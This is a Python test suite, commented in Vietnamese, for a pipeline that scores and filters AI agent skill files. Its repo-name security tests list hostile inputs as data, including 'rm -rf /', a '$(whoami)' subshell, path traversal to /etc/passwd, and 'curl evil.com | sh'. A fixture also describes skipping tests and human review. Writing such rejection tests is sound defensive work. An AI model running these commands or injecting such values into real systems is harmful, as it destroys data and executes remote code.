#!/usr/bin/env python3
"""
TEST SUITE — Kiểm tra toàn bộ hệ thống Skill Pipeline
Chạy: python3 -m pytest tests/ -v
Hoặc: python3 tests/test_pipeline.py
"""

import os
import sys
import re
import shutil
import tempfile
import difflib
import unittest

# Thêm scripts/ vào path để import
REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(REPO_ROOT, "scripts"))

# Import các hàm cần test
from auto_get_skills import (
    detect_branch,
    detect_domain,
    validate_skill,
    similarity_score,
    check_collision,
    REPO_PATTERN,
    DOMAIN_MAP,
    apply_profile_filter,
    load_profile,
    list_profiles,
)


# ============================================================
# FIXTURES — Dữ liệu test mẫu
# ============================================================

SKILL_GOOD = """---
name: api-contract-testing
description: "Test contract between consumer and provider API to ensure integration stays stable after upgrades."
---

# API Contract Testing

Use when: Integration tests pass but staging still breaks after deploy with 404/422 errors.
Also use when two services evolve independently and you need to guarantee the interface contract.

## What it does
Writes consumer-driven contract tests using Pact to verify API boundaries are respected
by both the consumer and the provider. This ensures that changes to one side do not
silently break the other, catching integration regressions before they reach staging.

## Steps
1. Define consumer expectations in a pact file — specify the request shape and expected response.
2. Run consumer tests locally to generate the pact artifact.
3. Publish pact to a shared broker (Pact Broker or PactFlow).
4. Run provider verification against the published pact on the CI pipeline.
5. Gate deployments: provider cannot deploy unless all consumer pacts pass verification.

## Process
Each phase is gated — move to the next only when the current phase is green.
Never skip the provider verification step even under time pressure.
Contract tests are lightweight and fast; there is no good reason to bypass them.

## When NOT to use
Do not use for testing internal implementation details.
This skill is for external API boundaries only.
"""

SKILL_TOO_SHORT = """---
name: my-skill
description: "Helps with stuff."
---
Use it.
"""

SKILL_NO_FRONTMATTER = """
# Some Skill

This skill does things when you want to do them.
Use it for various workflows and processes.
Steps: do this, then that.
"""

SKILL_DANGEROUS = """---
name: fast-ship
description: "Ship fast by skipping tests and pushing directly to production."
---

Use when you need to ship fast.

## Workflow
1. Write code quickly
2. Skip tests tdd to save time  
3. git push --force to override review
4. Deploy directly

## Process
No need for human review in this workflow.
"""

SKILL_WRITING = """---
name: novel-world-building
description: "Design world, setting, magic system and historical depth for novels."
---

Use when: Building fantasy or sci-fi world for a story or novel.

## What
Creates consistent world rules, character arcs and plot structure.

## Steps
1. Define world rules and magic system
2. Build character backgrounds
3. Create story beats and plot outline

## Process
Iterative world-building with feedback loops.
"""

SKILL_INVALID_NAME = """---
name: My Invalid Skill Name!
description: "A skill with a bad name that should fail validation."
---

Use when you need something. What it does is provide workflow steps.
Steps: step one, step two, step three, process begins here.
"""


# ============================================================
# TEST CLASS 1: detect_domain()
# ============================================================

class TestDetectDomain(unittest.TestCase):

    def test_engineering_default(self):
        self.assertEqual(detect_domain("code-review", "Review code before commit", None), "engineering")

    def test_writing_by_keyword(self):
        self.assertEqual(detect_domain("my-skill", "Write a novel with story arcs", None), "writing")

    def test_art_by_keyword(self):
        self.assertEqual(detect_domain("my-skill", "Create midjourney prompts for images", None), "art")

    def test_finance_by_keyword(self):
        self.assertEqual(detect_domain("my-skill", "Analyze balance sheet and cash flow", None), "finance")

    def test_productivity_by_keyword(self):
        self.assertEqual(detect_domain("my-skill", "handoff session to another agent", None), "productivity")

    def test_hint_overrides_content(self):
        # Hint luôn thắng dù content nói khác
        self.assertEqual(detect_domain("novel", "This is a story about novel ideas", "engineering"), "engineering")

    def test_invalid_hint_falls_through(self):
        # Hint không hợp lệ → dùng content
        self.assertEqual(detect_domain("novel", "Write a story and novel arc", "invalid_domain"), "writing")


# ============================================================
# TEST CLASS 2: detect_branch()
# ============================================================

class TestDetectBranch(unittest.TestCase):

    def test_spec_branch(self):
        branch = detect_branch("to-spec", "Convert conversation to spec document")
        self.assertIn("Ý tưởng", branch)

    def test_tdd_branch(self):
        branch = detect_branch("tdd", "Test driven development with red-green-refactor")
        self.assertIn("Code", branch)

    def test_debug_branch(self):
        branch = detect_branch("diagnosing-bugs", "Diagnose and debug hard errors")
        self.assertIn("Cứu hộ", branch)

    def test_setup_branch(self):
        branch = detect_branch("setup-env", "Install and deploy environment")
        self.assertIn("Nền tảng", branch)

    def test_unknown_defaults_to_code(self):
        branch = detect_branch("xyz-unknown", "Unknown content here")
        self.assertIn("Code", branch)


# ============================================================
# TEST CLASS 3: validate_skill() — Quality Gate
# ============================================================

class TestValidateSkill(unittest.TestCase):

    def test_good_skill_passes(self):
        score, report = validate_skill("api-contract-testing", SKILL_GOOD, "engineering")
        self.assertGreaterEqual(score, 70, f"Good skill should PASS, got {score}: {report}")

    def test_gate1_full_marks_for_valid_structure(self):
        score, report = validate_skill("api-contract-testing", SKILL_GOOD, "engineering")
        self.assertEqual(report["gate1_structure"]["score"], 20)

    def test_gate1_fails_invalid_name(self):
        score, report = validate_skill("My Invalid Skill!", SKILL_GOOD, "engineering")
        self.assertLess(report["gate1_structure"]["score"], 20)

    def test_gate1_fails_no_frontmatter(self):
        score, report = validate_skill("some-skill", SKILL_NO_FRONTMATTER, "engineering")
        self.assertEqual(report["gate1_structure"]["score"], 0)

    def test_gate2_fails_too_short(self):
        score, report = validate_skill("my-skill", SKILL_TOO_SHORT, "engineering")
        self.assertEqual(report["gate2_substance"]["score"], 0)

    def test_gate2_full_marks_for_rich_content(self):
        score, report = validate_skill("api-contract-testing", SKILL_GOOD, "engineering")
        self.assertEqual(report["gate2_substance"]["score"], 30)

    def test_gate4_valid_domain(self):
        score, report = validate_skill("tdd", SKILL_GOOD, "engineering")
        self.assertEqual(report["gate4_domain"]["score"], 15)

    def test_gate4_invalid_domain_fails(self):
        score, report = validate_skill("tdd", SKILL_GOOD, "unknown_domain")
        self.assertEqual(report["gate4_domain"]["score"], 0)

    def test_gate5_safe_content_passes(self):
        score, report = validate_skill("api-contract-testing", SKILL_GOOD, "engineering")
        self.assertEqual(report["gate5_safety"]["score"], 15)

    def test_gate5_dangerous_content_fails(self):
        score, report = validate_skill("fast-ship", SKILL_DANGEROUS, "engineering")
        self.assertEqual(report["gate5_safety"]["score"], 0)

    def test_dangerous_skill_rejected(self):
        score, report = validate_skill("fast-ship", SKILL_DANGEROUS, "engineering")
        self.assertLess(score, 70, "Dangerous skill should be REJECTED")

    def test_writing_skill_passes(self):
        score, report = validate_skill("novel-world-building", SKILL_WRITING, "writing")
        self.assertGreaterEqual(score, 70)

    def test_total_score_never_exceeds_100(self):
        score, _ = validate_skill("api-contract-testing", SKILL_GOOD, "engineering")
        self.assertLessEqual(score, 100)

    def test_total_score_never_below_zero(self):
        score, _ = validate_skill("BAD SKILL!!!", SKILL_TOO_SHORT, "unknown_domain")
        self.assertGreaterEqual(score, 0)


# ============================================================
# TEST CLASS 4: similarity_score()
# ============================================================

class TestSimilarityScore(unittest.TestCase):

    def test_identical_texts_score_one(self):
        text = "This is a sample skill content for testing purposes."
        self.assertAlmostEqual(similarity_score(text, text), 1.0)

    def test_completely_different_texts_score_low(self):
        a = "Python programming with async await coroutines"
        b = "Cooking pasta with tomato sauce and fresh herbs"
        score = similarity_score(a, b)
        self.assertLess(score, 0.5)

    def test_similar_texts_score_high(self):
        a = "Use when you need to review code before merging to main branch."
        b = "Use when you need to review code before merging to master branch."
        score = similarity_score(a, b)
        self.assertGreater(score, 0.8)

    def test_does_not_truncate_at_500_chars(self):
        """BUG REGRESSION: Đảm bảo không còn lỗi cũ truncate 500 chars"""
        # Hai text giống nhau ở 500 đầu nhưng khác ở phần sau
        common = "A" * 500
        a = common + " SKILL_A: Tests are mandatory, always run them before commit"
        b = common + " SKILL_B: Deploy fast, skip tests, push to production directly"
        score = similarity_score(a, b)
        # Nếu còn lỗi cũ: score = 1.0 (chỉ so 500 đầu)
        # Sau khi fix: score < 1.0 vì so đến 3000 ký tự
        self.assertLess(score, 1.0, "similarity_score must use more than 500 chars")

    def test_limit_handles_very_long_content(self):
        """Không bị chậm với file rất lớn"""
        long_text = "word " * 5000  # 25000 ký tự
        score = similarity_score(long_text, long_text)
        self.assertAlmostEqual(score, 1.0)


# ============================================================
# TEST CLASS 5: SECURITY — REPO_PATTERN
# ============================================================

class TestRepoNameSecurity(unittest.TestCase):

    VALID_REPOS = [
        "mattpocock/skills",
        "owner/repo",
        "owner-name/repo-name",
        "org.name/repo.js",
        "user123/my-skills-v2",
        "A/B",
    ]

    INVALID_REPOS = [
        "",
        "onlyone",
        "../../etc/passwd",
        "owner/repo; rm -rf /",
        "owner/$(whoami)",
        "owner/repo && curl evil.com | sh",
        "a/b/c",
        "owner/repo\x00evil",
        "../traversal/repo",
        "owner repo/name",
    ]

    def test_valid_repos_accepted(self):
        for repo in self.VALID_REPOS:
            with self.subTest(repo=repo):
                self.assertTrue(REPO_PATTERN.match(repo), f"Should accept: {repo!r}")

    def test_invalid_repos_rejected(self):
        for repo in self.INVALID_REPOS:
            with self.subTest(repo=repo):
                self.assertFalse(REPO_PATTERN.match(repo), f"Should reject: {repo!r}")

    def test_path_traversal_blocked(self):
        self.assertFalse(REPO_PATTERN.match("../../etc/passwd"))

    def test_shell_injection_blocked(self):
        self.assertFalse(REPO_PATTERN.match("owner/repo; rm -rf /"))

    def test_subshell_injection_blocked(self):
        self.assertFalse(REPO_PATTERN.match("owner/$(whoami)"))


# ============================================================
# TEST CLASS 6: Integration — File-based skill ingestion
# ============================================================

class TestIngestionIntegration(unittest.TestCase):

    def setUp(self):
        """Tạo thư mục tạm cho test."""
        self.test_dir = tempfile.mkdtemp()
        self.skill_dir = os.path.join(self.test_dir, "test-skill")
        os.makedirs(self.skill_dir)

    def tearDown(self):
        """Dọn dẹp sau test."""
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def _write_skill(self, content, name="test-skill"):
        skill_dir = os.path.join(self.test_dir, name)
        os.makedirs(skill_dir, exist_ok=True)
        with open(os.path.join(skill_dir, "SKILL.md"), "w") as f:
            f.write(content)
        return skill_dir

    def test_good_skill_directory_has_skill_md(self):
        skill_path = self._write_skill(SKILL_GOOD, "api-contract-testing")
        self.assertTrue(os.path.exists(os.path.join(skill_path, "SKILL.md")))

    def test_validate_good_skill_from_file(self):
        skill_path = self._write_skill(SKILL_GOOD, "api-contract-testing")
        with open(os.path.join(skill_path, "SKILL.md")) as f:
            content = f.read()
        score, _ = validate_skill("api-contract-testing", content, "engineering")
        self.assertGreaterEqual(score, 70)

    def test_validate_dangerous_skill_from_file(self):
        skill_path = self._write_skill(SKILL_DANGEROUS, "fast-ship")
        with open(os.path.join(skill_path, "SKILL.md")) as f:
            content = f.read()
        score, _ = validate_skill("fast-ship", content, "engineering")
        self.assertLess(score, 70)

    def test_domain_map_covers_all_expected_domains(self):
        expected = {"engineering", "writing", "art", "finance", "productivity", "misc"}
        self.assertEqual(set(DOMAIN_MAP.keys()), expected)


# ============================================================
# TEST CLASS 7: Profiles & Repository Skill Integrity
# ============================================================

class TestProfileAndRepositoryIntegrity(unittest.TestCase):

    def test_all_existing_skills_have_valid_yaml_frontmatter(self):
        """Đảm bảo 100% các file SKILL.md trong kho có YAML frontmatter hợp lệ."""
        import yaml
        skills_dir = os.path.join(REPO_ROOT, "skills")
        found_skills = 0
        slug_pattern = re.compile(r"^[a-z0-9\-]+$")

        for root, dirs, files in os.walk(skills_dir):
            dirs[:] = [d for d in dirs if d != "node_modules"]
            if "SKILL.md" in files:
                found_skills += 1
                skill_path = os.path.join(root, "SKILL.md")
                with open(skill_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()

                self.assertTrue(content.startswith("---"), f"{skill_path} phải bắt đầu bằng ---")
                parts = content.split("---", 2)
                self.assertGreaterEqual(len(parts), 3, f"{skill_path} frontmatter không đóng bằng ---")

                try:
                    fm = yaml.safe_load(parts[1])
                except Exception as e:
                    self.fail(f"YAML parser error in {skill_path}: {e}")

                self.assertIsInstance(fm, dict, f"Frontmatter in {skill_path} phải là dictionary")
                self.assertIn("name", fm, f"Thiếu field 'name' trong {skill_path}")
                self.assertIn("description", fm, f"Thiếu field 'description' trong {skill_path}")
                self.assertTrue(slug_pattern.match(fm["name"]), f"Tên '{fm['name']}' trong {skill_path} không đúng slug")
                self.assertGreaterEqual(len(str(fm["description"]).strip()), 20, f"Description quá ngắn trong {skill_path}")

        self.assertGreaterEqual(found_skills, 50, f"Kỳ vọng ít nhất 50 skills, tìm thấy {found_skills}")

    def test_apply_profile_filter_domains(self):
        """Kiểm tra apply_profile_filter lọc đúng domain."""
        profile = {
            "active_domains": ["engineering", "productivity"],
            "exclude_skills": [],
        }
        # engineering skill -> cho phép
        eng_path = os.path.join(REPO_ROOT, "skills", "engineering", "tdd")
        self.assertTrue(apply_profile_filter(eng_path, profile))

        # art skill -> bị từ chối
        art_path = os.path.join(REPO_ROOT, "skills", "art", "midjourney-prompt-architect")
        self.assertFalse(apply_profile_filter(art_path, profile))

    def test_apply_profile_filter_exclude_skills(self):
        """Kiểm tra apply_profile_filter lọc đúng exclude_skills."""
        profile = {
            "active_domains": ["engineering"],
            "exclude_skills": ["setup-matt-pocock-skills"],
        }
        allowed = os.path.join(REPO_ROOT, "skills", "engineering", "tdd")
        excluded = os.path.join(REPO_ROOT, "skills", "engineering", "setup-matt-pocock-skills")

        self.assertTrue(apply_profile_filter(allowed, profile))
        self.assertFalse(apply_profile_filter(excluded, profile))

    def test_apply_profile_filter_none_allows_all(self):
        """Nếu không có profile (profile=None) thì cho phép tất cả."""
        any_path = os.path.join(REPO_ROOT, "skills", "art", "some-art")
        self.assertTrue(apply_profile_filter(any_path, None))

    def test_load_profile_hungdaitool(self):
        """Kiểm tra tải profile hungdaitool hợp lệ."""
        prof = load_profile("hungdaitool")
        self.assertIsNotNone(prof)
        self.assertIn("active_domains", prof)
        self.assertIn("engineering", prof["active_domains"])

    def test_list_profiles(self):
        """Kiểm tra liệt kê profiles có sẵn."""
        profiles = list_profiles()
        self.assertIn("hungdaitool", profiles)
        self.assertNotIn("template", profiles)  # template.yml bị loại trừ


# ============================================================
# RUNNER
# ============================================================

if __name__ == "__main__":
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    test_classes = [
        TestDetectDomain,
        TestDetectBranch,
        TestValidateSkill,
        TestSimilarityScore,
        TestRepoNameSecurity,
        TestIngestionIntegration,
        TestProfileAndRepositoryIntegrity,
    ]

    for cls in test_classes:
        suite.addTests(loader.loadTestsFromTestCase(cls))

    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    sys.exit(0 if result.wasSuccessful() else 1)
